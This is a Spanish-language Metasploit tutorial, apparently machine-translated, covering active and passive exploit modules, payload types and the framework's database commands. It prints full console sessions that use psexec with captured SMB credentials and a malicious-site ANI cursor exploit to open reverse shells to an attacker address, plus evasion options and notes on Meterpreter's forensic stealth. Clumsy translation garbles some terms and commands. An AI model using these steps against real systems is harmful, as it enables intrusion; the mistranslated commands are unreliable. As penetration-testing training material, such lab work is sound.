# TRABAJAR CON MÓDULOS ACTIVOS Y PASIVOS EN METASPLOIT

Todos los exploits en Metasploit Framework se clasificarán en dos categorías: activos y pasivos .

## EXPLOITS ACTIVOS
Los exploits activos explotarán un host específico, se ejecutarán hasta su finalización y luego se cerrarán.

Los módulos de fuerza bruta saldrán cuando se abra un caparazón de la víctima.
La ejecución del módulo se detiene si se encuentra un error.
Puede forzar un módulo activo a un segundo plano pasando '-j' al comando de explotación:

	exploit msf ( ms08_067_netapi )> exploit -j
	[*] Exploit ejecutándose como trabajo en segundo plano.
	exploit msf ( ms08_067_netapi )>

EJEMPLO
El siguiente ejemplo hace uso de un conjunto de credenciales adquiridas previamente para explotar y obtener un shell inverso en el sistema objetivo.

	msf> use exploit/windows/smb/psexec 
	msf exploit ( psexec )> configure RHOST 192.168.1.100
	RHOST => 192.168.1.100
	msf exploit ( psexec )> set PAYLOAD windows/shell/reverse_tcp
	PAYLOAD => windows / shell / reverse_tcp
	msf exploit ( psexec )> set LHOST 192.168.1.5
	LHOST => 192.168.1.5
	msf exploit ( psexec )> set LPORT 4444
	LPORT => 4444
	msf exploit ( psexec )> set SMBUSER víctima
	SMBUSER => víctima
	msf exploit ( psexec )> set SMBPASS s3cr3t
	SMBPASS => s3cr3t
	exploit msf ( psexec )> exploit
	
	[*] Conectando al servidor...
	[*] Manejador inverso iniciado
	[*] Autenticando como usuario 'víctima' ...
	[*] Subiendo carga útil ...
	[*] Creado \ hikmEeEM.exe ...
	[*] Vinculante a 367abb81-9844-35f1-ad32-98f038001003: 2.0@ncacn_np: 192.168.1.100 [\ svcctl] ...
	[*] Vinculado a 367abb81-9844-35f1-ad32-98f038001003: 2.0@ncacn_np: 192.168.1.100 [\ svcctl] ...
	[*] Obteniendo un identificador de administrador de servicios ...
	[*] Creando un nuevo servicio (ciWyCVEp - "MXAVZsCqfRtZwScLdexnD") ...
	[*] Cerrando la manija de servicio ...
	[*] Servicio de apertura ...
	[*] Iniciando el servicio ...
	[*] Eliminando el servicio ...
	[*] Cerrando la manija de servicio ...
	[*] Eliminando \ hikmEeEM.exe ...
	[*] Etapa de envío (240 bytes)
	[*] Se abrió la sesión 1 del shell de comandos (192.168.1.5:4444 -> 192.168.1.100:1073)
	
	Microsoft Windows XP [Versión 5.1.2600]
	(C) Copyright 1985-2001 Microsoft Corp.
	
	C:\WINDOWS\system32>


## EXPLOITS PASIVOS
Los exploits pasivos esperan a los hosts entrantes y los explotan cuando se conectan.

Los exploits pasivos casi siempre se centran en clientes como navegadores web, clientes FTP, etc.
También se pueden usar junto con exploits de correo electrónico, esperando conexiones.
Los ataques pasivos informan de los shells a medida que ocurren pasando '-l' al comando de sesiones. Pasar '-i' interactuará con un shell.

	msf exploit ( ani_loadimage_chunksize )> sesiones -l
	
	Sesiones activas
	===============
	
	  Id Descripción Túnel
	  - ----------- ------
	  1 Meterpreter 192.168.1.5:52647 -> 192.168.1.100:4444
	
	msf exploit ( ani_loadimage_chunksize )> sesiones -i 1
	[*] Iniciando interacción con 1 ...
	
	meterpreter>


EJEMPLO
El siguiente resultado muestra la configuración para aprovechar la vulnerabilidad del cursor animado. El exploit no se activa hasta que una víctima navega a nuestro sitio web malicioso.


	msf> usar exploit/windows/browser/ani_loadimage_chunksize 
	msf exploit ( ani_loadimage_chunksize )> set URIPATH /
	URIPATH => /
	msf exploit ( ani_loadimage_chunksize )> set PAYLOAD windows/shell/reverse_tcp
	PAYLOAD => windows/shell/reverse_tcp
	msf exploit ( ani_loadimage_chunksize )> set LHOST 192.168.1.5
	LHOST => 192.168.1.5
	msf exploit ( ani_loadimage_chunksize )> set LPORT 4444
	LPORT => 4444
	msf exploit ( ani_loadimage_chunksize )> exploit
	[*] Exploit ejecutándose como trabajo en segundo plano.
	
	[*] Manejador inverso iniciado
	[*] Usando URL: http://0.0.0.0:8080/
	[*] IP local: http://192.168.1.5:8080/
	[*] Servidor iniciado.
	exploit msf ( ani_loadimage_chunksize )>
	[*] Intentando explotar ani_loadimage_chunksize
	[*] Enviando página HTML a 192.168.1.100:1077 ...
	[*] Intentando explotar ani_loadimage_chunksize
	[*] Enviando Desbordamiento de pila de tamaño de fragmento (HTTP) de ANI LoadAniIcon () de Windows a 192.168.1.100:1077 ...
	[*] Etapa de envío (240 bytes)
	[*] Se abrió la sesión 2 del shell de comandos (192.168.1.5:4444 -> 192.168.1.100:1078)
	
	msf exploit ( ani_loadimage_chunksize )> sesiones -i 2
	[*] Iniciando interacción con 2 ...
	
	Microsoft Windows XP [Versión 5.1.2600]
	(C) Copyright 1985-2001 Microsoft Corp.
	
	C:\Documents and Settings\victim\Desktop>


## USANDO EXPLOITS EN METASPLOIT

Seleccionar un exploit en Metasploit agrega los comandos de exploit y check a msfconsole.


	msf> use exploit/windows/smb/ms09_050_smb2_negotiate_func_index 
	msf exploit ( ms09_050_smb2_negotiate_func_index )> help
	...recorte...
	Explorar comandos
	================
	
	    Descripción del comando
	    ------- -----------
	    check Comprobar para ver si un objetivo es vulnerable
	    exploit Lanzar un intento de exploit
	    pry Abre una sesión de palanca en el módulo actual
	    rcheck Vuelve a cargar el módulo y comprueba si el objetivo es vulnerable
	    reload Solo recarga el módulo
	    back a ejecutar Alias ​​para rexploit
	    rexploit Vuelve a cargar el módulo y lanza un intento de explotación
	    run Alias ​​para exploit

	MSF exploit ( ms09_050_smb2_negotiate_func_index )>


## SHOW
El uso de un exploit también agrega más opciones al comando show .

Objetivos de explotación de MSF

	msf exploit ( ms09_050_smb2_negotiate_func_index )> show options
	
	Explotar objetivos:
	
	   Nombre de identificación
	   ----
	   0 Windows Vista SP1 / SP2 y Server 2008 (x86)
	Cargas útiles (payloads) de explotación de MSF
	msf exploit ( ms09_050_smb2_negotiate_func_index )> show payloads
	
	Cargas útiles compatibles
	===================
	
	   Nombre Fecha de divulgación Rango Descripción
	   ---- --------------- ---- -----------
	   Carga útil personalizada normal genérica / personalizada
	   generic/debug_trap normal Trampa de depuración genérica x86
	   generic/shell_bind_tcp shell de comando genérico normal, enlazar TCP en línea
	   generic/shell_reverse_tcp shell de comando genérico normal, TCP inverso en línea
	   generic/tight_loop normal Genérico x86 Tight Loop
	   windows/adduser normal Windows Execute net user/ADD
	...recorte...


Opciones de explotación de MSF 

	msf exploit ( ms09_050_smb2_negotiate_func_index )> show options

	Opciones del módulo (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):
	
	   Nombre Configuración actual requerida Descripción
	   ---- --------------- -------- -----------
	   RHOST sí La dirección de destino
	   RPORT 445 sí El puerto de destino (TCP)
	   WAIT 180 yes El número de segundos de espera para que se complete el ataque.
	
	
	Explotar objetivo:
	
	   Nombre de identificación
	   ----
	   0 Windows Vista SP1 / SP2 y Server 2008 (x86)

AVANZADO

	msf exploit ( ms09_050_smb2_negotiate_func_index )> show advanced
	
	Opciones avanzadas del módulo (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):
	
	   Nombre Configuración actual requerida Descripción
	   ---- --------------- -------- -----------
	   CHOST no La dirección del cliente local
	   CPORT no El puerto del cliente local
	   ConnectTimeout 10 sí Número máximo de segundos para establecer una conexión TCP
	   ContextInformationFile no El archivo de información que contiene información de contexto
	   DisablePayloadHandler false no Deshabilita el código del controlador para la carga útil seleccionada
	   EnableContextEncoding false no Usar contexto transitorio al codificar cargas útiles


EVASIÓN

	msf exploit ( ms09_050_smb2_negotiate_func_index )> show evasion
	Opciones de evasión del módulo:
	
	   Nombre Configuración actual requerida Descripción
	   ---- --------------- -------- -----------
	   SMB :: obscure_trans_pipe_level 0 sí Cadena PIPE oscura en TransNamedPipe (nivel 0-3)
	   SMB :: pad_data_level 0 yes Coloque un relleno adicional entre los encabezados y los datos (nivel 0-3)
	   SMB :: pad_file_level 0 sí Nombres de ruta oscuros usados ​​en abrir / crear (nivel 0-3)
	   SMB :: pipe_evasion false yes Habilitar lecturas / escrituras segmentadas para SMB Pipes
	   SMB :: pipe_read_max_size 1024 sí Tamaño máximo de búfer para lecturas de tubería
	   SMB :: pipe_read_min_size 1 sí Tamaño mínimo de búfer para lecturas de tubería
	   SMB :: pipe_write_max_size 1024 sí Tamaño máximo de búfer para escrituras de canalización
	   SMB :: pipe_write_min_size 1 sí Tamaño mínimo de búfer para escrituras de canalización
	   TCP :: max_send_size 0 no Tamaño máximo del segmento tcp. (0 = deshabilitar)
	   TCP :: send_delay 0 sin retrasos insertados antes de cada envío. (0 = deshabilitar)


## COMPRENDER LAS CARGAS ÚTILES EN METASPLOIT

### ¿QUÉ SIGNIFICA LA CARGA ÚTIL(payload)?

Una carga útil en Metasploit se refiere a un módulo de explotación. Hay tres tipos diferentes de módulos de carga útil en Metasploit Framework: Singles , Teatralizadores y Etapas . Estos diferentes tipos permiten una gran versatilidad y pueden ser útiles en numerosos tipos de escenarios. Si una carga útil está organizada o no, se representa mediante '/' en el nombre de la carga útil. Por ejemplo, windows/shell_bind_tcp es una carga útil única sin escenario, mientras que windows/shell/bind_tcp consta de un stager (bind_tcp) y un escenario (shell).

#### CONTENIDO

- Singles
- Stagers
- Stage


##### Singles
Los solteros (singles) son cargas útiles (payloads) que son independientes y completamente independientes. Una carga útil única puede ser algo tan simple como agregar un usuario al sistema de destino o ejecutar calc.exe.

Este tipo de cargas útiles son autónomas, por lo que pueden detectarse con controladores que no sean metasploit como netcat.

##### Stagers
Los Stagers configuran una conexión de red entre el atacante y la víctima y están diseñados para ser pequeños y confiables. Es difícil hacer siempre bien ambas cosas, por lo que el resultado es múltiples etapas similares. Metasploit utilizará el mejor cuando pueda y recurrirá a uno menos preferido cuando sea necesario.

Windows NX frente a NO-NX Stagers

- Problema de confiabilidad para CPU NX y DEP
- Los stagers de NX son más grandes (VirtualAlloc)
- El valor predeterminado es ahora compatible con NX + Win7
 

##### Stage
Las etapas son componentes de carga útil que descargan los módulos de Stagers. Las diversas etapas de carga útil proporcionan funciones avanzadas sin límites de tamaño, como Meterpreter , VNC Injection y el iPhone 'ipwn' Shell.

Las etapas de carga útil utilizan automáticamente 'etapas intermedias'

- Un solo recv () falla con grandes cargas útiles
- El escalonador recibe el escalonador medio
- La etapa intermedia realiza una descarga completa.
- También mejor para RWX


### TIPOS DE CARGA ÚTIL EN EL MARCO DE METASPLOIT

#### AMPLIACIÓN DE LOS TIPOS DE CARGA ÚTIL EN METASPLOIT
Cubrimos brevemente los tres tipos principales de carga útil: singles, stagers y etapas (stages) . Metasploit contiene muchos tipos diferentes de cargas útiles, cada una de las cuales cumple una función única dentro del marco. Echemos un vistazo breve a los diversos tipos de cargas útiles disponibles y tengamos una idea de cuándo debe usarse cada tipo.

##### EN LÍNEA (NO POR ETAPAS)
Una única carga útil que contiene el exploit y el código de shell completo para la tarea seleccionada. Las cargas útiles en línea son por diseño más estables que sus contrapartes porque contienen todo en uno. Sin embargo, algunos exploits no admiten el tamaño resultante de estas cargas útiles.

##### VETERANO
Las cargas útiles de la etapa funcionan junto con las cargas de la etapa para realizar una tarea específica. Un stager establece un canal de comunicación entre el atacante y la víctima y lee en una carga útil de etapa para ejecutar en el host remoto.

##### METERPRETER
Meterpreter, la forma abreviada de Meta-Interpreter, es una carga útil avanzada y multifacética que funciona mediante inyección dll. El Meterpreter reside completamente en la memoria del host remoto y no deja rastros en el disco duro, por lo que es muy difícil de detectar con técnicas forenses convencionales. Los scripts y complementos se pueden cargar y descargar dinámicamente según sea necesario y el desarrollo de Meterpreter es muy sólido y está en constante evolución.

##### PASIVOX
PassiveX es una carga útil que puede ayudar a eludir los cortafuegos salientes restrictivos. Para ello, utiliza un control ActiveX para crear una instancia oculta de Internet Explorer. Usando el nuevo control ActiveX, se comunica con el atacante a través de solicitudes y respuestas HTTP.

##### NONX
El bit NX (No eXecute) es una función incorporada en algunas CPU para evitar que el código se ejecute en ciertas áreas de la memoria. En Windows, NX se implementa como Prevención de ejecución de datos (DEP). Las cargas útiles de Metasploit NoNX están diseñadas para eludir DEP.

##### WORDS
Las cargas útiles ordinales son cargas útiles basadas en etapas de Windows que tienen distintas ventajas y desventajas. Las ventajas son que funciona en todos los tipos y lenguajes de Windows que se remontan a Windows 9x sin la definición explícita de una dirección de retorno. También son extremadamente pequeños. Sin embargo, dos desventajas muy específicas hacen que no sean la opción predeterminada. El primero es que se basa en el hecho de que ws2_32.dll se carga en el proceso que se explota antes de la explotación. El segundo es que es un poco menos estable que los otros stagers.

##### IPV6
Las cargas útiles de Metasploit IPv6, como su nombre indica, están diseñadas para funcionar en redes IPv6.

##### INYECCIÓN DE DLL REFLECTANTE
La inyección de DLL reflectante es una técnica mediante la cual se inyecta una carga útil de etapa en un proceso de host comprometido que se ejecuta en la memoria, sin tocar nunca el disco duro del host. Las cargas útiles de VNC y Meterpreter utilizan inyección de DLL reflectante. Puede leer más sobre esto de Stephen Fewer, el creador del método de inyección de DLL reflectante . [Nota: este sitio ya no existe y está vinculado con fines históricos]



## BASES DE DATOS EN METASPLOIT

ALMACENAR INFORMACIÓN EN UNA BASE DE DATOS USANDO METASPLOIT
Al realizar una prueba de penetración, con frecuencia es un desafío realizar un seguimiento de todo lo que ha hecho en (o hacia) la red de destino. Aquí es donde tener una base de datos configurada puede ser un gran ahorro de tiempo. Metasploit tiene soporte integrado para el sistema de base de datos PostgreSQL.

El sistema permite un acceso rápido y fácil a la información del escaneo y nos da la capacidad de importar y exportar los resultados del escaneo desde varias herramientas de terceros. También podemos utilizar esta información para configurar las opciones del módulo con bastante rapidez. Lo más importante es que mantiene nuestros resultados limpios y organizados.


	msf> base de datos de ayuda
	
	Comandos de backend de base de datos
	=========================
	
	    Descripción del comando
	    ------- -----------
	    db_connect Conectarse a una base de datos existente
	    db_disconnect Desconectarse de la instancia de base de datos actual
	    db_export Exportar un archivo que contiene el contenido de la base de datos
	    db_import Importar un archivo de resultados de escaneo (el tipo de archivo se detectará automáticamente)
	    db_nmap Ejecuta nmap y registra la salida automáticamente
	    db_rebuild_cache Reconstruye el caché del módulo almacenado en la base de datos
	    db_status Muestra el estado actual de la base de datos
	    hosts Lista todos los hosts en la base de datos
	    botín Lista todo el botín en la base de datos
	    notas Lista todas las notas en la base de datos
	    servicios Lista todos los servicios en la base de datos
	    vulns Lista todas las vulnerabilidades en la base de datos
	    espacio de trabajo Cambiar entre espacios de trabajo de base de datos
	
	msf> hosts
	
	Hospedadores
	=====
	
	dirección mac nombre os_name os_flavor os_sp propósito información comentarios
	------- --- ---- ------- --------- ----- ------- ---- ---- ----
	172.16.194.134 Dispositivo desconocido         
	172.16.194.163 172.16.194.163 Servidor Linux Ubuntu         
	172.16.194.172 00: 0C: 29: D1: 62: 80 172.16.194.172 Servidor Linux Ubuntu         
	
	msf> servicios -p 21
	
	Servicios
	========
	
	puerto de host proto nombre estado información
	---- ---- ----- ---- ----- ----
	172.16.194.172 21 tcp ftp abierto vsftpd 2.3.4


## Usando la base de datos de Metasploit

 Contenido:

-  SETUP
- WORKSPACES
- IMPORTING & SCANNING
- BACKING UP
- HOSTS
- SETTING UP MODULES
- SERVICES
- CSV EXPORT
- CREDS
- LOOT


## CONFIGURAR NUESTRA BASE DE DATOS METASPLOIT
En Parrot OS, deberá iniciar el servidor postgresql antes de usar la base de datos.


	┌─[root@cs-academy]─[~]
	└──╼ # systemctl iniciar postgresql


Después de iniciar postgresql, debe crear e inicializar la base de datos msf con msfdb init


	┌─[root@cs-academy]─[~]
	└──╼ # msfdb init
	Creando el usuario de base de datos 'msf'
	Ingrese la contraseña para el nuevo rol: 
	Ingrese de nuevo: 
	Creación de bases de datos 'msf' y 'msf_test'
	Creando archivo de configuración en /usr/share/metasploit-framework/config/database.yml
	Crear esquema de base de datos inicial


## USAR ESPACIOS DE TRABAJO EN METASPLOIT
Cuando cargamos msfconsole y ejecutamos db_status , podemos confirmar que Metasploit se ha conectado correctamente a la base de datos.


	msf> db_status
	[*] postgresql conectado a msf


Ver esta capacidad tiene la intención de realizar un seguimiento de nuestras actividades y escaneos en orden. Es imperativo que comencemos con el pie derecho. Una vez conectados a la base de datos, podemos empezar a organizar nuestros diferentes movimientos utilizando lo que se denominan 'espacios de trabajo'. Esto nos da la capacidad de guardar diferentes escaneos desde diferentes ubicaciones / redes / subredes, por ejemplo.

Al emitir el comando ' espacio de trabajo ' desde msfconsole , se mostrarán los espacios de trabajo seleccionados actualmente. El espacio de trabajo ' predeterminado ' se selecciona al conectarse a la base de datos, que está representada por el * junto a su nombre.


	msf> workspace
	* defecto
	  msfu
	  lab1
	  lab2
	  lab3
	  lab4
	msf> 

Como podemos ver, esto puede ser muy útil cuando se trata de mantener las cosas 'ordenadas'. Cambiemos el espacio de trabajo actual a 'msfu'.

	msf> workspace msfu
	[*] Espacio de trabajo: msfu
	msf> espacio de trabajo
	  defecto
	* msfu
	  lab1
	  lab2
	  lab3
	  lab4
	msf> 

Para crear y eliminar un espacio de trabajo, uno simplemente usa -a o -d seguido del nombre en el indicador de msfconsole.

	msf> workspace -a lab4
	[*] Espacio de trabajo agregado: lab4
	msf> 
	
	
	msf> workspace -d lab4 
	[*] Espacio de trabajo eliminado: lab4
	msf> workspace

Es así de simple, usar el mismo comando y agregar el modificador -h nos proporcionará las otras capacidades del comando.

	msf> workspace -h
	Uso:
	    workspace Lista de espacios de trabajo
	    workspace -v Lista de espacios de trabajo de forma detallada
	    workspace [nombre] Cambiar espacio de trabajo
	    workspace -a [nombre] ... Agregar espacio (s) de trabajo
	    workspace -d [nombre] ... Eliminar espacio (s) de trabajo
	    workspace -D Eliminar todos los espacios de trabajo
	    workspace -r Cambiar nombre del espacio de trabajo
	    workspace -h Muestra esta información de ayuda
	
	msf> 


A partir de ahora, cualquier escaneo o importación de aplicaciones de terceros se guardará en este espacio de trabajo.

Ahora que estamos conectados a nuestra base de datos y la configuración del espacio de trabajo, veamos cómo completarla con algunos datos. Primero veremos los diferentes comandos 'db_' disponibles para usar usando el comando de ayuda de msfconsole.

	msf> ayuda
	...recorte...
	
	Comandos de backend de base de datos
	=========================
	
	    Descripción del comando
	    ------- -----------
	    creds Lista todas las credenciales en la base de datos
	    db_connect Conectarse a una base de datos existente
	    db_disconnect Desconectarse de la instancia de base de datos actual
	    db_export Exportar un archivo que contiene el contenido de la base de datos
	    db_import Importar un archivo de resultados de escaneo (el tipo de archivo se detectará automáticamente)
	    db_nmap Ejecuta nmap y registra la salida automáticamente
	    db_rebuild_cache Reconstruye el caché del módulo almacenado en la base de datos
	    db_status Muestra el estado actual de la base de datos
	    hosts Lista todos los hosts en la base de datos
	    botín Lista todo el botín en la base de datos
	    notas Lista todas las notas en la base de datos
	    servicios Lista todos los servicios en la base de datos
	    vulns Lista todas las vulnerabilidades en la base de datos
	    espacio de trabajo Cambiar entre espacios de trabajo de base de datos


## IMPORTACIÓN Y ESCANEO

Hay varias formas de hacer esto, desde escanear un host o una red directamente desde la consola, o importar un archivo de un escaneo anterior. Comencemos por importar un escaneo nmap del host 'metasploitable 2'. Esto se hace usando db_import seguido de la ruta a nuestro archivo.


	msf> db_import /root/msfu/nmapScan 
	[*] Importando datos 'Nmap XML'
	[*] Importar: Analizando con 'Rex :: Parser :: NmapXMLStreamParser'
	[*] Importando el host 172.16.194.172
	[*] Importado correctamente / root / msfu / nmapScan
	msf> hosts
	
	Hospedadores
	=====
	
	dirección mac nombre os_name os_flavor os_sp propósito información comentarios
	------- --- ---- ------- --------- ----- ------- ---- ---- ----
	172.16.194.172 00: 0C: 29: D1: 62: 80 Servidor Linux Ubuntu         
	
	msf> 


Una vez completada, podemos confirmar la importación emitiendo el comando hosts . Esto mostrará todos los hosts almacenados en nuestro espacio de trabajo actual. También podemos escanear un host directamente desde la consola usando el comando db_nmap . Los resultados del análisis se guardarán en nuestra base de datos actual. El comando funciona de la misma manera que la versión de línea de comandos de nmap.


	msf> db_nmap -A 172.16.194.134
	[*] Nmap: Iniciando Nmap 5.51SVN (http://nmap.org) en 2012-06-18 12:36 EDT
	[*] Nmap: informe de escaneo de Nmap para 172.16.194.134
	[*] Nmap: El host está activo (latencia de 0.00031s).
	[*] Nmap: No se muestra: 994 puertos cerrados
	[*] Nmap: VERSIÓN DEL SERVICIO DE ESTADO PORTUARIO
	[*] Nmap: 80 / tcp abierto http Apache httpd 2.2.17 ((Win32) mod_ssl / 2.2.17 OpenSSL / 0.9.8o PHP / 5.3.4 
	
	...recorte...
	
	[*] Nmap: DIRECCIÓN HOP RTT
	[*] Nmap: 1 0,31 ms 172.16.194.134
	[*] Nmap: Detección de SO y Servicio realizada. Informe cualquier resultado incorrecto en http://nmap.org/submit/.
	[*] Nmap: Nmap hecho: 1 dirección IP (1 host arriba) escaneada en 14,91 segundos
	msf>
	
	
	msf> hosts
	
	Hospedadores
	=====
	
	dirección mac nombre os_name os_flavor os_sp propósito información comentarios
	------- --- ---- ------- --------- ----- ------- ---- ---- ----
	172.16.194.134 00: 0C: 29: 68: 51: BB Servidor Microsoft Windows XP         
	172.16.194.172 00: 0C: 29: D1: 62: 80 Servidor Linux Ubuntu         
	
	msf> 


## COPIA DE SEGURIDAD DE NUESTROS DATOS

Exportar nuestros datos fuera del entorno de Metasploit es muy sencillo. Usando el comando db_export, toda nuestra información recopilada se puede guardar en un archivo XML. Este formato se puede utilizar y manipular fácilmente más adelante para fines de informes. El comando tiene 2 salidas, el formato xml, que exportará toda la información almacenada actualmente en nuestro espacio de trabajo activo, y el formato pwdump, que exporta todo lo relacionado con las credenciales usadas / recopiladas.


	msf> db_export -h
	Uso:
	    db_export -f [-a] [nombre de archivo]
	    El formato puede ser uno de los siguientes: xml, pwdump
	[-] No se especificó ningún archivo de salida
	
	msf> db_export -f xml /root/msfu/Exported.xml
	[*] Iniciando la exportación del espacio de trabajo msfu a /root/msfu/Exported.xml [xml] ...
	[*] >> Iniciando la exportación del informe
	[*] >> Iniciando la exportación de hosts
	[*] >> Iniciando la exportación de eventos
	[*] >> Iniciando la exportación de servicios
	[*] >> Iniciando la exportación de credenciales
	[*] >> Iniciando la exportación de sitios web
	[*] >> Iniciando la exportación de páginas web
	[*] >> Iniciando la exportación de formularios web
	[*] >> Iniciando la exportación de web vulns
	[*] >> Exportación finalizada del informe
	[*] Exportación finalizada del espacio de trabajo msfu a /root/msfu/Exported.xml [xml] 


## USO DEL COMANDO HOSTS

Ahora que podemos importar y exportar información hacia y desde nuestra base de datos, veamos cómo podemos usar esta información dentro de msfconsole. Hay muchos comandos disponibles para buscar información específica almacenada en nuestra base de datos. Nombres de hosts, direcciones, servicios descubiertos, etc. Incluso podemos usar los datos resultantes para completar la configuración del módulo, como RHOSTS. Veremos cómo se hace esto un poco más tarde.

El comando hosts se usó anteriormente para confirmar la presencia de datos en nuestra base de datos. Veamos las diferentes opciones disponibles y veamos cómo las usamos para brindarnos información rápida y útil. Emitir el comando con -h mostrará el menú de ayuda.


	msf> hosts -h
	Uso: hosts [opciones] [addr1 addr2 ...]
	
	OPCIONES:
	  -a, - agregar Agregar los hosts en lugar de buscar
	  -d, - eliminar Elimina los hosts en lugar de buscar
	  -c <col1, col2> Muestra solo las columnas dadas (consulte la lista a continuación)
	  -h, - ayuda Muestra esta información de ayuda
	  -u, - up Solo muestra los hosts que están activos
	  -o Enviar salida a un archivo en formato csv
	  -O Ordenar filas por número de columna especificado
	  -R, - rhosts Establecer RHOSTS de los resultados de la búsqueda
	  -S, - buscar Cadena de búsqueda para filtrar por
	  -i, - info Cambiar la información de un host
	  -n, - nombre Cambia el nombre de un host
	  -m, - comentario Cambiar el comentario de un anfitrión
	  -t, - etiqueta Agrega o especifica una etiqueta a un rango de hosts


Columnas disponibles: dirección, arco, comm, comentarios, created_at, cred_count, selected_arch, exploit_attempt_count, host_detail_count, info, mac, nombre, note_count, os_family, os_flavor, os_lang, os_name, os_sp, propósito, alcance, service_count, estado, updated_at, virtual_host , vuln_count, etiquetas
Comenzaremos pidiendo al comando hosts que muestre solo la dirección IP y el tipo de sistema operativo usando el interruptor -c .


	msf> hosts -c address, os_flavor
	
	Hospedadores
	=====
	
	dirección os_flavor
	------- ---------
	172.16.194.134 XP
	172.16.194.172 Ubuntu
	CONFIGURAR MÓDULOS


Otra característica interesante de la que disponemos es la posibilidad de buscar en todas nuestras entradas algo específico. Imagínese si quisiéramos encontrar solo las máquinas basadas en Linux de nuestro escaneo. Para esto usaríamos la opción -S . Esta opción se puede combinar con nuestro ejemplo anterior y ayudar a afinar nuestros resultados.

	
	msf> hosts -c address, os_flavor -S Linux
	
	Hospedadores
	=====
	
	dirección os_flavor
	------- ---------
	172.16.194.172 Ubuntu
	
	msf>

Usando la salida de nuestro ejemplo anterior, lo introduciremos en el módulo auxiliar de escaneo 'tcp'.


	msf auxiliar ( tcp )> show options
	
	Opciones del módulo (auxiliar/escáner/portscan/tcp):
	
	   Nombre Configuración actual requerida Descripción
	   ---- --------------- -------- -----------
	   CONCURRENCY 10 sí El número de puertos simultáneos para verificar por host
	   FILTRO no La cadena de filtro para capturar tráfico
	   INTERFACE no El nombre de la interfaz
	   PCAPFILE no El nombre del archivo de captura PCAP para procesar
	   PUERTOS 1-10000 sí Puertos para escanear (por ejemplo, 22-25,80,110-900)
	   RHOSTS sí El rango de direcciones de destino o identificador CIDR
	   SNAPLEN 65535 sí El número de bytes para capturar
	   THREADS 1 sí El número de subprocesos simultáneos
	   TIMEOUT 1000 sí El tiempo de espera de conexión del conector en milisegundos


Podemos ver por defecto, nada está configurado en 'RHOSTS', agregaremos el interruptor -R al comando hosts y ejecutaremos el módulo. Con suerte, se ejecutará y escaneará nuestro objetivo sin problemas.


	auxiliar de msf ( tcp )> hosts -c address, os_flavor -S Linux -R
	
	Hospedadores
	=====
	
	dirección os_flavor
	------- ---------
	172.16.194.172 Ubuntu
	
	RHOSTS => 172.16.194.172
	
	msf auxiliar ( tcp )> run
	
	[*] 172.16.194.172:25 - TCP ABIERTO
	[*] 172.16.194.172:23 - TCP ABIERTO
	[*] 172.16.194.172:22 - TCP ABIERTO
	[*] 172.16.194.172:21 - TCP ABIERTO
	[*] 172.16.194.172:53 - TCP ABIERTO
	[*] 172.16.194.172:80 - TCP ABIERTO
	
	...recorte...
	
	[*] 172.16.194.172:5432 - TCP ABIERTO
	[*] 172.16.194.172:5900 - TCP ABIERTO
	[*] 172.16.194.172:6000 - TCP ABIERTO
	[*] 172.16.194.172:6667 - TCP ABIERTO
	[*] 172.16.194.172:6697 - TCP ABIERTO
	[*] 172.16.194.172:8009 - TCP ABIERTO
	[*] 172.16.194.172:8180 - TCP ABIERTO
	[*] 172.16.194.172:8787 - TCP ABIERTO
	[*] Escaneado 1 de 1 hosts (100% completo)
	[*] Se completó la ejecución del módulo auxiliar


Por supuesto, esto también funciona si nuestros resultados contienen más de una dirección.

	auxiliar de msf ( tcp )> hosts -R
	
	Hospedadores
	=====
	
	dirección mac nombre os_name os_flavor os_sp propósito información comentarios
	------- --- ---- ------- --------- ----- ------- ---- ---- ----
	172.16.194.134 00: 0C: 29: 68: 51: BB Servidor Microsoft Windows XP         
	172.16.194.172 00: 0C: 29: D1: 62: 80 Servidor Linux Ubuntu         
	
	RHOSTS => 172.16.194.134 172.16.194.172
	
	msf auxiliar ( tcp )> mostrar opciones

	Opciones del módulo (auxiliar/escáner/portscan/tcp):
	
	   Nombre Configuración actual requerida Descripción
	   ---- --------------- -------- -----------
	   CONCURRENCY 10 sí El número de puertos simultáneos para verificar por host
	   FILTRO no La cadena de filtro para capturar tráfico
	   INTERFACE no El nombre de la interfaz
	   PCAPFILE no El nombre del archivo de captura PCAP para procesar
	   PUERTOS 1-10000 sí Puertos para escanear (por ejemplo, 22-25,80,110-900)
	   RHOSTS        172.16.194.134 172.16.194.172   sí El rango de direcciones de destino o identificador CIDR
	   SNAPLEN 65535 sí El número de bytes para capturar
	   THREADS 1 sí El número de subprocesos simultáneos
	   TIMEOUT 1000 sí El tiempo de espera de conexión del conector en milisegundos


Puede ver lo útil que puede resultar si nuestra base de datos contuviera cientos de entradas. Podríamos buscar solo máquinas con Windows, luego configurar la opción RHOSTS para el módulo auxiliar smb_version muy rápidamente. El conmutador set RHOSTS está disponible en casi todos los comandos que interactúan con la base de datos.


## SERVICIOS

Otra forma de buscar en la base de datos es mediante el comando services . Como en los ejemplos anteriores, podemos extraer información muy específica con poco esfuerzo.


	msf> servicios -h
	
	Uso: servicios [-h] [-u] [-a] [-r] [-p> puerto1, puerto2>] [-s> nombre1, nombre2>] [-o] [addr1 addr2 ...]
	
	  -a, - agregar Agregar los servicios en lugar de buscar
	  -d, - eliminar Elimina los servicios en lugar de buscar
	  -c <col1, col2> Muestra solo las columnas dadas
	  -h, - ayuda Muestra esta información de ayuda
	  -s <nombre1, nombre2> Busca una lista de nombres de servicios
	  -p <puerto1, puerto2> Busca una lista de puertos
	  -r Mostrar solo los servicios [tcp | udp]
	  -u, - up Solo muestra los servicios que están activos
	  -o Enviar salida a un archivo en formato csv
	  -R, - rhosts Establecer RHOSTS de los resultados de la búsqueda
	  -S, - buscar Cadena de búsqueda para filtrar por


Columnas disponibles: created_at, info, name, port, proto, state, updated_at
De la misma forma que el comando hosts , podemos especificar qué campos se mostrarán. Junto con el modificador -S , también podemos buscar un servicio que contenga una cadena en particular.

	msf> servicios -c nombre, información 172.16.194.134
	
	Servicios
	========
	
	información del nombre de host
	---- ---- ----
	172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl / 2.2.17 OpenSSL / 0.9.8o PHP / 5.3.4 mod_perl / 2.0.4 Perl / v5.10.1 
	172.16.194.134 msrpc Microsoft Windows RPC 
	172.16.194.134 netbios-ssn   
	172.16.194.134 http Apache httpd 2.2.17 (Win32) mod_ssl / 2.2.17 OpenSSL / 0.9.8o PHP / 5.3.4 mod_perl / 2.0.4 Perl / v5.10.1 
